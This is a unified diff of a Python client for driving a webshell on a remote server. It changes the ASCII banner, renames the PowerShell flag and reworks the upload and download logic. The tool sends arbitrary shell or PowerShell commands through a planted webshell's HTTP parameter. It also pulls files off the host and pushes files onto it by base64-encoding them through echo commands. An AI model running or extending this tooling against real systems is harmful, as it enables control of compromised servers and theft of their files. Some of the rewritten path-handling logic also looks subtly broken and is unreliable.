@@ -17,13 +17,13 @@ def send_command(command, webshell, method, param="code"):
 
 if __name__ == "__main__":
  banner = """
-  ██████ ▓██   ██▓  ██████  ██░ ██ ▓█████  ██▓     ██▓    
- ▓██░  ██▒▒██  ██▒▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
- ▓██░ ██▓▒ ▒██ ██░░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░    
- ▒██▄█▓▒ ▒ ░ ▐██▓░  ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    
- ▒██▒ ░  ░ ░ ██▒▓░▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒
- ▒█▒░ ░  ░  ██▒▒▒ ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
- ░▒ ░     ▓██ ░▒░ ░ ░▒    ░ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
+  ██████ ▓██   ░██  ██████  ██░ ██ ▓█████  ██▓     ██▓    
+ ▓██░  ██▒██░   ██▒██    ▒ ▓██  ██▒▓██    ▓██▒    ▓██▒    
+ ▓██░  ██▒ ██  ██░░ ▓███   ▒██████░▒████  ▒██░    ▒██░    
+ ▒██████ ▒ ░████▓░  ▒   ██▒░██ ░██ ▒██    ▒██░    ▒██░    
+ ▒██▒ ░  ░ ░ ██▒▓░▒██████▒▒░██▒░██▓░█████▒░██████▒░██████▒
+ ▒██░ ░  ░  ██▒▒▒ ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
+ ░▒ ░     ▓██ ░▒░ ░ ░▒    ░ ▒ ░ ░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
  ░░   ░   ▒ ▒ ░░  ░  ░  ░   ░  ░░ ░         ░ ░     ░ ░   
  ░        ░             ░      ░      ░       ░          ░ 
 
@@ -35,7 +35,7 @@ print (colored(banner, "green"))
 parser = argparse.ArgumentParser()
 parser.add_argument("url", help="Webshell URL", type=str)
 parser.add_argument("method", help="HTTP Method to execute command (GET or POST)", type=str)
-parser.add_argument("--ps", default=False, action="store_true", help="PowerShell command execution (Only on Windows hosts)")
+parser.add_argument("-ps", "--PowerShell", action="store_true", help="PowerShell command execution (Only on Windows hosts)")
 parser.add_argument("-p", "--param", default="code", help="Parameter to use with custom WebShell", type=str)
 args = parser.parse_args()
 
@@ -76,19 +76,21 @@ try:
                 remotefile = command.split()[2]
                 remotefiletmp = remotefile.rstrip() + ".tmp"
                 if not slash in remotefile:
-                   remotefile = path.rstrip() + slash + command.split()[2]
-                if not slash in remotefiletmp:
-                   remotefiletmp = path.rstrip() + slash + command.split()[2] + ".tmp"
+                   if remotefile == ".":
+                      remotefile = path.rstrip() + slash + command.split()[1]
+                   else:
+                   	  remotefile = path.rstrip() + slash + command.split()[2]
                 if not slash in localfile:
                    cwd = os.getcwd()
                 print (colored("Uploading file "+ cwd + "/" + localfile +" on "+ remotefile +"..\n", "yellow"))
                 f = open(localfile, "rb") ; rawfiledata = f.read() ; base64data = base64.b64encode(rawfiledata)
-                upload = send_command("echo " + str(base64data.rstrip(), "utf8") + (" > ") + remotefiletmp, WEBSHELL, HTTP_METHOD, PARAM)
+                upload = send_command("echo " + str(base64data.rstrip(), "utf8") + " > " + remotefile, WEBSHELL, HTTP_METHOD, PARAM)
                 if system == "linux":
-                   send_command("base64 -di " + remotefiletmp + (" > ") + remotefile + " ; rm -f " + remotefiletmp, WEBSHELL, HTTP_METHOD, PARAM)
+                   send_command("base64 -di " + remotefile + " > " + remotefiletmp + " ; mv " + remotefiletmp + " " +
+                   remotefile, WEBSHELL, HTTP_METHOD, PARAM)
                 if system == "windows":
                    command = " ; [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64)) > "
-                   send_command("$base64 = cat -raw " + remotefiletmp + command + remotefile + " ; rm -force " + remotefiletmp, WEBSHELL, HTTP_METHOD, PARAM)
+                   send_command("$base64 = cat -raw " + remotefile + command + remotefile, WEBSHELL, HTTP_METHOD, PARAM)
              else:
                 if "download" in command.split()[0]: 
                    remotefile = command.split()[1]
@@ -97,6 +99,8 @@ try:
                       remotefile = path.rstrip() + slash + command.split()[1]
                    if not slash in localfile:
                       cwd = os.getcwd()
+                      if localfile == ".":
+                      	 localfile = command.split()[1]
                    print (colored("Downloading file "+ remotefile +" on "+ cwd + "/" + localfile +"..\n", "yellow"))
                    if system == "linux":
                       base64data = send_command("base64 " + remotefile, WEBSHELL, HTTP_METHOD, PARAM)
@@ -137,7 +141,7 @@ try:
                         print (colored(content, "yellow"))
 
                       else:
-                        if args.ps:
+                        if args.PowerShell:
                            content = send_command("powershell " + command, WEBSHELL, HTTP_METHOD, PARAM)
                            print (colored(content, "yellow"))
                         else:
